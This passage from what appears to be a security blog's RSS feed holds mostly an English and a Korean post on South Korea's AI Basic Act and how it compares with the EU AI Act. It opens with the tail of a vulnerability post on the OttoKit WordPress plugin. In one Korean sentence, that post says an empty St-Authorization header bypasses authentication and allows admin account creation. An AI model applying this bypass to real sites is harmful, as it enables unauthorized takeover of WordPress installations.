&#xC54A;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC704;&#xCC98;&#xB7FC; <code>St-Authorization</code> &#xD5E4;&#xB354;&#xC5D0; &#xBE48; &#xAC12;&#xC744; &#xB123;&#xAC8C; &#xB418;&#xBA74; &#xC544;&#xC608; &#xC778;&#xC99D;&#xACFC;&#xC815;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC774;  &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Privilege-Escalation/">Privilege Escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/OttoKit/">OttoKit</category>
      
      <category domain="https://hackyboiz.github.io/tags/WordPress/">WordPress</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/18/pwndorei/2025-05-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] The AI Basic Act of South Korea(en)</title>
      <link>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_en/</link>
      <guid>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_en/</guid>
      <pubDate>Fri, 16 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/05/16/romi0x/ai_act_en/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hello, romi0x!&lt;/p&gt;
&lt;p&gt;Today, I will explain the &lt;strong&gt;Artific</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/05/16/romi0x/ai_act_en/image.png" alt="image.png"></p><p>Hello, romi0x!</p><p>Today, I will explain the <strong>Artificial Intelligence Development and Trust-Based Foundation Act</strong> (referred to as the &#x201C;AI Basic Law&#x201D;), which is a South Korean law set to be implemented in January 2026.</p><h2 id="1-Overview-of-South-Korea&#x2019;s-AI-Basic-Law"><a href="#1-Overview-of-South-Korea&#x2019;s-AI-Basic-Law" class="headerlink" title="1. Overview of South Korea&#x2019;s AI Basic Law"></a>1. Overview of South Korea&#x2019;s AI Basic Law</h2><p>The <strong>AI Basic Law</strong> is a South Korean legislation aimed at promoting AI technology development and establishing a regulatory framework based on trust. It is the first law of its kind to be fully implemented globally, drawing international attention (the EU&#x2019;s AI law is set to be implemented in August 2026). This law aims to establish legal standards for regulation and promotion, as AI technology is becoming increasingly important across various industries.</p><h2 id="2-Global-AI-Legislation-Status"><a href="#2-Global-AI-Legislation-Status" class="headerlink" title="2. Global AI Legislation Status"></a>2. Global AI Legislation Status</h2><p>AI-related legislation is being actively developed around the world. The <strong>EU</strong> implemented the <strong>EU AI Act</strong>, the world&#x2019;s first comprehensive AI regulation, on August 1, 2024. The <strong>United States</strong> has also laid the legal groundwork through the <strong>National Artificial Intelligence Initiative Act 2020</strong> and the <strong>AI Innovation Act</strong>. South Korea has passed the <strong>AI Basic Law</strong>, with the law set to come into effect on January 22, 2026. This law, along with the EU AI Act, has garnered international attention as a significant step in the regulation and promotion of AI technology.</p><h2 id="3-Main-Purposes-of-South-Korea&#x2019;s-AI-Basic-Law"><a href="#3-Main-Purposes-of-South-Korea&#x2019;s-AI-Basic-Law" class="headerlink" title="3. Main Purposes of South Korea&#x2019;s AI Basic Law"></a>3. Main Purposes of South Korea&#x2019;s AI Basic Law</h2><p>The AI Basic Law has two main objectives:</p><p>First, to <strong>promote AI technology and related industries</strong> through the establishment of a government support system. The Minister of Science, Technology, and Information will develop a basic plan every three years to foster the development of AI technology, support small businesses and startups, and facilitate the construction and operation of AI data centers.</p><p>Second, to <strong>strengthen regulations</strong> on AI systems, including <strong>high-impact AI</strong> and <strong>generative AI</strong>. High-impact AI refers to systems that can have significant effects on life, health, property, and basic rights, particularly in industries such as <strong>energy, healthcare, transportation, and lending</strong>. Operators of these systems are required to establish transparency, safety, and risk management measures, and they will be subject to penalties such as fines for non-compliance.</p><h2 id="4-Key-Issues-and-Controversies"><a href="#4-Key-Issues-and-Controversies" class="headerlink" title="4. Key Issues and Controversies"></a>4. Key Issues and Controversies</h2><p>The key issues related to the AI Basic Law&#x2019;s enforcement regulations include &#x2460; the definition of high-impact AI, &#x2461; watermarking obligations, and &#x2462; government investigation powers.</p><h3 id="1-Definition-of-High-Impact-AI"><a href="#1-Definition-of-High-Impact-AI" class="headerlink" title="1) Definition of High-Impact AI"></a>1) Definition of High-Impact AI</h3><ul><li><strong>High-Impact AI</strong>: An AI system that can have significant effects on life, health, property, or basic rights.</li><li><strong>Generative AI</strong>: AI systems that generate various outputs such as text, images, etc.</li><li><strong>AI Industry</strong>: The industry that provides AI technology or related services.</li><li><strong>AI Operators</strong>: Entities such as corporations, individuals, or organizations engaged in the AI industry.</li></ul><p>There has been criticism regarding the vague definition of <strong>high-impact AI</strong> in the AI Basic Law. High-impact AI is primarily meant to refer to systems that can have significant impacts on industries like <strong>energy, healthcare, transportation, and lending</strong>. However, there is a lack of clear criteria for determining which AI systems fall under this category. For example, there is debate over whether AI used solely for credit score calculation in the lending industry should be classified as high-impact AI. Some businesses argue that high-impact AI should be categorized based on its <strong>usage</strong> rather than its function.</p><h3 id="2-Watermarking-Obligations"><a href="#2-Watermarking-Obligations" class="headerlink" title="2) Watermarking Obligations"></a>2) Watermarking Obligations</h3><ul><li><strong>Transparency Requirements (Article 31)</strong>:<ul><li>When providing products or services that use high-impact or generative AI systems, businesses must clearly inform users in advance. If an AI-generated output is provided, it must be marked as such, and users must be made aware of this, especially when the output closely resembles reality. Failure to comply can result in a fine of up to 30 million Korean won.</li></ul></li><li><strong>Safety Requirements (Article 32)</strong>:<ul><li>AI systems must identify and assess potential risks throughout their entire lifecycle (from development to disposal), and mitigation measures must be in place. AI systems that perform significant computations must adhere to stricter safety standards. In the event of a risk, businesses must have a response system and continuously monitor the system. Reports on compliance must be submitted regularly to the Minister of Science and ICT.</li></ul></li></ul><p>Concerns have been raised that the watermarking obligation could negatively affect creative activities, such as in the production of movies, webtoons, and animations. If watermarking is required for every AI-generated background image, it may diminish the quality and creative freedom in content production.</p><h3 id="3-Excessive-Government-Investigation-Powers"><a href="#3-Excessive-Government-Investigation-Powers" class="headerlink" title="3) Excessive Government Investigation Powers"></a>3) Excessive Government Investigation Powers</h3><p>The AI Basic Law grants the government the authority to review or certify high-impact AI businesses in advance. However, there are concerns about <strong>privacy breaches</strong> and <strong>cybersecurity threats</strong> arising from excessive investigations. It is necessary to establish clear guidelines to prevent unwarranted fact-finding or excessive verification.</p><h2 id="5-Comparison-with-the-EU-AI-Act"><a href="#5-Comparison-with-the-EU-AI-Act" class="headerlink" title="5. Comparison with the EU AI Act"></a>5. Comparison with the EU AI Act</h2><p>The <strong>AI Basic Act</strong> (K-AI Act) and the <strong>EU AI Act</strong> differ significantly in terms of regulatory targets, scope, and enforcement mechanisms. The EU AI Act classifies AI into <strong>four risk levels</strong>, applying granular and tiered regulations accordingly. In contrast, Korea&#x2019;s AI Basic Act regulates only <strong>high-impact AI</strong> and <strong>generative AI</strong>. The EU AI Act also stipulates much stricter penalties, including <strong>fines of up to 7% of global turnover</strong>, setting it apart from Korea&#x2019;s approach.</p><div class="table-container"><table><thead><tr><th>Category</th><th>EU AI Act</th><th>K-AI Act</th></tr></thead><tbody><tr><td><strong>Legislative Purpose</strong></td><td>Human-centered, protection of fundamental rights, promotion of trustworthy AI</td><td>Advancement of AI technologies and industries, securing global competitiveness</td></tr><tr><td><strong>Legislative Philosophy</strong></td><td><strong>Risk-based approach</strong>, focused on preemptive regulation</td><td><strong>Promotion-oriented approach</strong>, flexible regulatory structure</td></tr></tbody></table></div><p>The EU aims to protect <strong>fundamental rights</strong>, promote <strong>market integration</strong>, and ensure <strong>technological reliability</strong>, applying risk-differentiated regulation. In contrast, the K-AI Act focuses on the <strong>growth potential of the AI industry</strong>, emphasizing <strong>technology development and ecosystem activation</strong> through a more flexible regulatory framework.</p><ul><li><strong>EU AI Act: Comprehensive &amp; Sophisticated Classification System</strong><ul><li>AI systems are classified into <strong>four levels of risk</strong> (prohibited, high-risk, limited risk, minimal risk)</li><li>High-risk AI must meet requirements such as <strong>pre-market conformity assessment</strong>, <strong>technical documentation</strong>, <strong>log retention</strong>, and <strong>human oversight</strong></li><li>Examples: remote biometric identification, monitoring of students/workers, credit scoring, insurance pricing systems</li></ul></li><li><strong>K-AI Act: Focus on High-Impact &amp; Generative AI</strong><ul><li>Primarily manages &#x201C;high-impact AI&#x201D; and &#x201C;generative AI,&#x201D; though specific definitions remain ambiguous</li><li>Emphasizes <strong>voluntary and flexible regulation</strong> via guidelines and executive decrees rather than strict legal mandates</li></ul></li></ul><h2 id="6-Future-Challenges-and-the-Need-for-Input"><a href="#6-Future-Challenges-and-the-Need-for-Input" class="headerlink" title="6. Future Challenges and the Need for Input"></a>6. Future Challenges and the Need for Input</h2><p>The AI Basic Law is met with both positive expectations and critical concerns. On one hand, it is meaningful in that it provides a legal foundation for promoting AI technology and industry. On the other hand, there is criticism that the definition of high-risk AI is vague, and that important areas such as personal data and copyright protection remain insufficient. Therefore, it is important that relevant stakeholders actively participate in the process of drafting enforcement ordinances and guidelines to help supplement and refine the law&#x2019;s specific contents.</p><p>The author believes that one of the persistent issues is that policy always lags behind the pace of technological advancement. That said, hastily introducing laws and systems without proper preparation can also be dangerous. Once policy is in place, regulation inevitably follows&#x2014;and in turn, this could end up hindering technological growth. Especially in a field like AI, where rapid transformation and innovation are essential, overly restrictive regulations may cause the country to fall behind in global competition.</p><p>So here&#x2019;s a question for you, the reader:</p><p><strong>&#x201C;Is it possible for regulation to keep up with the speed of technology?&#x201D;</strong></p><p><strong>&#x201C;If not, should we allow technology to progress first and address problems afterward?&#x201D;</strong></p><p><strong>&#x201C;Between technological advancement and public safety, which should take priority?&#x201D;</strong></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.kisa.or.kr/20201/form?postSeq=241&amp;page=1">https://www.kisa.or.kr/20201/form?postSeq=241&amp;page=1</a><br><a href="https://www.skshieldus.com/blog-security/security-trend-idx50">https://www.skshieldus.com/blog-security/security-trend-idx50</a><br><a href="https://v.daum.net/v/20250418162437559">https://v.daum.net/v/20250418162437559</a><br><a href="https://www.lawtimes.co.kr/LawFirm-NewsLetter/204461">https://www.lawtimes.co.kr/LawFirm-NewsLetter/204461</a><br><a href="https://zdnet.co.kr/view/?no=20241226170834">https://zdnet.co.kr/view/?no=20241226170834</a><br><a href="https://www.kita.net/board/totalTradeNews/totalTradeNewsDetail.do?no=85889&amp;siteId=1">https://www.kita.net/board/totalTradeNews/totalTradeNewsDetail.do?no=85889&amp;siteId=1</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/ai/">ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/aiAct/">aiAct</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 인공지능기본법(ko)</title>
      <link>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_ko/</link>
      <guid>https://hackyboiz.github.io/2025/05/16/romi0x/ai_act_ko/</guid>
      <pubDate>Fri, 16 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/05/16/romi0x/ai_act_ko/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! romi0x&amp;#xC785;&amp;#xB2C8</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/05/16/romi0x/ai_act_ko/image.png" alt="image.png"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! romi0x&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xC624;&#xB298;&#xC740; &#xB0B4;&#xB144; 1&#xC6D4; &#xC2DC;&#xD589;&#xC608;&#xC815;&#xC778; <a href="https://www.law.go.kr/%EB%B2%95%EB%A0%B9/%EC%9D%B8%EA%B3%B5%EC%A7%80%EB%8A%A5%20%EB%B0%9C%EC%A0%84%EA%B3%BC%20%EC%8B%A0%EB%A2%B0%20%EA%B8%B0%EB%B0%98%20%EC%A1%B0%EC%84%B1%20%EB%93%B1%EC%97%90%20%EA%B4%80%ED%95%9C%20%EA%B8%B0%EB%B3%B8%EB%B2%95/(20676,20250121"><strong>&#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xBC1C;&#xC804;&#xACFC; &#xC2E0;&#xB8B0; &#xAE30;&#xBC18; &#xC870;&#xC131; &#xB4F1;&#xC5D0; &#xAD00;&#xD55C; &#xAE30;&#xBCF8;&#xBC95;(&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;)</strong></a>)&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="1-&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;-&#xAC1C;&#xC694;"><a href="#1-&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;-&#xAC1C;&#xC694;" class="headerlink" title="1. &#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95; &#xAC1C;&#xC694;"></a>1. &#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95; &#xAC1C;&#xC694;</h2><p><strong>&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;</strong>&#xC740; 2026&#xB144; 1&#xC6D4; 22&#xC77C; &#xC2DC;&#xD589;&#xC744; &#xBAA9;&#xD45C;&#xB85C; &#xC81C;&#xC815;&#xB41C; &#xB300;&#xD55C;&#xBBFC;&#xAD6D;&#xC758; &#xBC95;&#xB960;&#xB85C;, AI &#xAE30;&#xC220;&#xC758; &#xBC1C;&#xC804;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xACE0; &#xC2E0;&#xB8B0;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xADDC;&#xC81C; &#xCCB4;&#xACC4;&#xB97C; &#xAD6C;&#xCD95;&#xD558;&#xB294; &#xB370; &#xC911;&#xC810;&#xC744; &#xB450;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD5C;&#xCD08;&#xB85C; &#xC804;&#xBA74; &#xC2DC;&#xD589;&#xB418;&#xB294; AI &#xAE30;&#xBCF8;&#xBC95;&#xC73C;&#xB85C; &#xC804; &#xC138;&#xACC4;&#xC758; &#xC8FC;&#xBAA9;&#xC744; &#xBC1B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(EU&#xB294; 2026&#xB144; 8&#xC6D4; &#xC2DC;&#xD589; &#xC608;&#xC815;) AI &#xAE30;&#xC220;&#xC774; &#xB2E4;&#xC591;&#xD55C; &#xC0B0;&#xC5C5; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xAC8C; &#xB428;&#xC5D0; &#xB530;&#xB77C; &#xADDC;&#xC81C;&#xC640; &#xC9C4;&#xD765;&#xC744; &#xC704;&#xD55C; &#xBC95;&#xC801; &#xAE30;&#xC900;&#xC744; &#xB9C8;&#xB828;&#xD558;&#xB294; &#xBAA9;&#xC801;&#xC744; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h2 id="2-AI&#xBC95;-&#xAE00;&#xB85C;&#xBC8C;-&#xD604;&#xD669;"><a href="#2-AI&#xBC95;-&#xAE00;&#xB85C;&#xBC8C;-&#xD604;&#xD669;" class="headerlink" title="2. AI&#xBC95; &#xAE00;&#xB85C;&#xBC8C; &#xD604;&#xD669;"></a>2. AI&#xBC95; &#xAE00;&#xB85C;&#xBC8C; &#xD604;&#xD669;</h2><p>&#xC804; &#xC138;&#xACC4;&#xC801;&#xC73C;&#xB85C; AI &#xAD00;&#xB828; &#xBC95;&#xC81C;&#xD654;&#xAC00; &#xD65C;&#xBC1C;&#xD788; &#xC9C4;&#xD589;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>EU</strong>&#xB294; 2024&#xB144; 8&#xC6D4; 1&#xC77C;, &#xC804; &#xC138;&#xACC4; &#xCD5C;&#xCD08;&#xB85C; &#xD3EC;&#xAD04;&#xC801;&#xC778; AI &#xADDC;&#xC81C;&#xB97C; &#xB3C4;&#xC785;&#xD55C; <strong>EU &#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xBC95;</strong>&#xC744; &#xC2DC;&#xD589;&#xD588;&#xC73C;&#xBA70;, <strong>&#xBBF8;&#xAD6D;</strong>&#xC740; <strong>&#xAD6D;&#xAC00; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xAD6C;&#xC0C1;&#xBC95; 2020</strong>&#xACFC; <strong>&#xBBF8;&#xAD6D; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC9C4;&#xD765;&#xBC95;</strong> &#xB4F1;&#xC744; &#xD1B5;&#xD574; AI &#xAD00;&#xB828; &#xBC95;&#xC801; &#xD2C0;&#xC744; &#xB9C8;&#xB828;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xD55C;&#xBBFC;&#xAD6D;&#xB3C4; <strong>&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;</strong>&#xC744; &#xD1B5;&#xACFC;&#xC2DC;&#xCF30;&#xACE0;, 2026&#xB144; 1&#xC6D4; &#xC2DC;&#xD589;&#xC744; &#xC55E;&#xB450;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; AI &#xAE30;&#xC220;&#xC758; &#xADDC;&#xC81C; &#xBC0F; &#xC9C4;&#xD765;&#xC744; &#xC704;&#xD55C; &#xC911;&#xC694;&#xD55C; &#xBC95;&#xC801; &#xC2DC;&#xB3C4;&#xB85C;, EU AI&#xBC95;&#xACFC; &#xD568;&#xAED8; &#xAD6D;&#xC81C;&#xC801;&#xC73C;&#xB85C; &#xD070; &#xAD00;&#xC2EC;&#xC744; &#xBC1B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="3-AI-&#xAE30;&#xBCF8;&#xBC95;&#xC758;-&#xC8FC;&#xC694;-&#xBAA9;&#xC801;"><a href="#3-AI-&#xAE30;&#xBCF8;&#xBC95;&#xC758;-&#xC8FC;&#xC694;-&#xBAA9;&#xC801;" class="headerlink" title="3. AI &#xAE30;&#xBCF8;&#xBC95;&#xC758; &#xC8FC;&#xC694; &#xBAA9;&#xC801;"></a>3. AI &#xAE30;&#xBCF8;&#xBC95;&#xC758; &#xC8FC;&#xC694; &#xBAA9;&#xC801;</h2><p>&#xC778;&#xACF5;&#xC9C0;&#xB2A5;&#xAE30;&#xBCF8;&#xBC95;&#xC740; &#xD06C;&#xAC8C; &#xB450; &#xAC00;&#xC9C0; &#xC8FC;&#xC694; &#xBAA9;&#xC801;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB;&#xC9F8;, <strong>AI &#xAE30;&#xC220; &#xBC0F; &#xAD00;&#xB828; &#xC0B0;&#xC5C5; &#xC9C4;&#xD765;</strong>&#xC744; &#xC704;&#xD574; &#xC815;&#xBD80; &#xCC28;&#xC6D0;&#xC758; &#xC9C0;&#xC6D0; &#xCCB4;&#xACC4;&#xB97C; &#xC218;&#xB9BD;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xACFC;&#xD559;&#xAE30;&#xC220;&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xBD80; &#xC7A5;&#xAD00;&#xC740; 3&#xB144;&#xB9C8;&#xB2E4; AI &#xAE30;&#xC220; &#xBC1C;&#xC804;&#xC744; &#xC704;&#xD55C; &#xAE30;&#xBCF8; &#xACC4;&#xD68D;&#xC744; &#xC218;&#xB9BD;&#xD558;&#xACE0;, &#xC911;&#xC18C;&#xAE30;&#xC5C5;&#xACFC; &#xCC3D;&#xC5C5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xBA70;, AI &#xB370;&#xC774;&#xD130; &#xC13C;&#xD130; &#xAD6C;&#xCD95;&#xACFC; &#xC6B4;&#xC601; &#xB4F1;&#xC744; &#xD1B5;&#xD574; &#xC0B0;&#xC5C5; &#xBC1C;&#xC804;&#xC744; &#xB3D5;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB458;&#xC9F8;, <strong>&#xACE0;&#xC601;&#xD5A5; AI</strong>&#xC640; <strong>&#xC0DD;&#xC131;&#xD615; AI</strong>&#xB97C; &#xD3EC;&#xD568;&#xD55C; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB300;&#xD55C; &#xADDC;&#xC81C;&#xB97C; &#xAC15;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xACE0;&#xC601;&#xD5A5; AI&#xB294; &#xC0DD;&#xBA85;, &#xC2E0;&#xCCB4;, &#xC7AC;&#xC0B0;, &#xAE30;&#xBCF8;&#xAD8C;&#xC5D0; &#xC2EC;&#xAC01;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC73C;&#xB85C;, &#xC8FC;&#xB85C; <strong>&#xC5D0;&#xB108;&#xC9C0;, &#xC758;&#xB8CC;, &#xAD50;&#xD1B5;, &#xB300;&#xCD9C;</strong> &#xC0B0;&#xC5C5;&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC6B4;&#xC601;&#xD558;&#xB294; &#xC0AC;&#xC5C5;&#xC790;&#xB294; &#xD22C;&#xBA85;&#xC131;, &#xC548;&#xC804;&#xC131;, &#xC704;&#xD5D8; &#xAD00;&#xB9AC; &#xBC29;&#xC548;&#xC744; &#xB9C8;&#xB828;&#xD574;&#xC57C; &#xD558;&#xBA70;, &#xC774;&#xB97C; &#xC704;&#xBC18;&#xD560; &#xACBD;&#xC6B0; &#xACFC;&#xD0DC;&#xB8CC; &#xB4F1;&#xC758; &#xCC98;&#xBC8C;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="4-&#xC8FC;&#xC694;-&#xC7C1;&#xC810;&#xACFC;-&#xB17C;&#xB780;"><a href="#4-&#xC8FC;&#xC694;-&#xC7C1;&#xC810;&#xACFC;-&#xB17C;&#xB780;" class="headerlink" title="4. &#xC8FC;&#xC694; &#xC7C1;&#xC810;&#xACFC; &#xB17C;&#xB780;"></a>4. &#xC8FC;&#xC694; &#xC7C1;&#xC810;&#xACFC; &#xB17C;&#xB780;</h2><p><img src="/2025/05/16/romi0x/ai_act_ko/image2.png" alt="[https://zdnet.co.kr/view/?no=20241226170834](https://zdnet.co.kr/view/?no=20241226170834)"></p><p><a href="https://zdnet.co.kr/view/?no=20241226170834">https://zdnet.co.kr/view/?no=20241226170834</a></p><p>AI &#xAE30;&#xBCF8;&#xBC95; &#xC2DC;&#xD589;&#xB839; &#xAD00;&#xB828; &#xD575;&#xC2EC; &#xC7C1;&#xC810;&#xC740; &#x2460;&#xACE0;&#xC601;&#xD5A5; AI&#xC758; &#xC815;&#xC758; &#x2461;&#xC6CC;&#xD130;&#xB9C8;&#xD06C; &#xD45C;&#xC2DC; &#xC758;&#xBB34;&#xD654; &#x2462;&#xC815;&#xBD80;&#xC758; &#xC870;&#xC0AC; &#xAD8C;&#xD55C;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="1-&#xACE0;&#xC601;&#xD5A5;-AI&#xC758;-&#xC815;&#xC758;"><a href="#1-&#xACE0;&#xC601;&#xD5A5;-AI&#xC758;-&#xC815;&#xC758;" class="headerlink" title="1) &#xACE0;&#xC601;&#xD5A5; AI&#xC758; &#xC815;&#xC758;"></a>1) &#xACE0;&#xC601;&#xD5A5; AI&#xC758; &#xC815;&#xC758;</h3><p><img src="/2025/05/16/romi0x/ai_act_ko/image3.png" alt="image.png"></p><ul><li>&#xACE0;&#xC601;&#xD5A5; &#xC778;&#xACF5;&#xC9C0;&#xB2A5;: &#xC0DD;&#xBA85;, &#xC2E0;&#xCCB4;, &#xC7AC;&#xC0B0;, &#xAE30;&#xBCF8;&#xAD8C; &#xB4F1;&#xC5D0; &#xC2EC;&#xAC01;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xB294; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC2DC;&#xC2A4;&#xD15C;</li><li>&#xC0DD;&#xC131;&#xD615; &#xC778;&#xACF5;&#xC9C0;&#xB2A5;: &#xD14D;&#xC2A4;&#xD2B8;, &#xC774;&#xBBF8;&#xC9C0; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xACB0;&#xACFC;&#xBB3C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC2DC;&#xC2A4;&#xD15C;</li><li>&#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC0B0;&#xC5C5;: &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xAE30;&#xC220; &#xB610;&#xB294; &#xAD00;&#xB828; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC0B0;&#xC5C5; &#xC804;&#xBC18;</li><li>&#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC0AC;&#xC5C5;&#xC790;: &#xC778;&#xACF5;&#xC9C0;&#xB2A5; &#xC0B0;&#xC5C5;&#xC5D0; &#xC885;&#xC0AC;&#xD558;&#xB294; &#xBC95;&#xC778;, &#xAC1C;&#xC778;, &#xAE30;&#xAD00; &#xB4F1; &#xC8FC;&#xCCB4;</li></ul><p>AI &#xAE30;&#xBCF8;&#xBC95;&#xC5D0;&#xC11C; &#xADDC;&#xC815;&#xD55C; <strong>&#xACE0;&#xC601;&#xD5A5; AI</strong>&#xC758; &#xC815;&#xC758;&#xB294; &#xB2E4;&#xC18C; &#xBAA8;&#xD638;&#xD558;&#xB2E4;&#xB294; &#xC9C0;&#xC801;&#xC744; &#xBC1B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACE0;&#xC601;&#xD5A5; AI&#xB294; &#xC8FC;&#xB85C; <strong>&#xC5D0;&#xB108;&#xC9C0;, &#xC758;&#xB8CC;, &#xAD50;&#xD1B5;, &#xB300;&#xCD9C;</strong> &#xB4F1; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xB294; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5A4; AI &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xC774;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD574; &#xAD6C;&#xCCB4;&#xC801;&#xC778; &#xAE30;&#xC900;&#xC774; &#xBD80;&#xC871;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, AI&#xAC00; &#xC2E0;&#xC6A9; &#xC810;&#xC218; &#xC0B0;&#xCD9C;&#xC5D0;&#xB9CC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xACBD;&#xC6B0;, &#xB300;&#xCD9C; &#xC0B0;&#xC5C5;&#xC5D0;&#xC11C;&#xB3C4; &#xC774;&#xB97C; &#xACE0;&#xC601;&#xD5A5; AI&#xB85C; &#xBD84;&#xB958;&#xD560;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xB17C;&#xB780;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xBD80; &#xAE30;&#xC5C5;&#xB4E4;&#xC740; &#xACE0;&#xC601;&#xD5A5; AI&#xB97C; <strong>&#xC0AC;&#xC6A9; &#xBC29;&#xC2DD;</strong>&#xC5D0; &#xB530;&#xB77C; &#xAD6C;&#xBD84;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xACE0; &#xC8FC;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 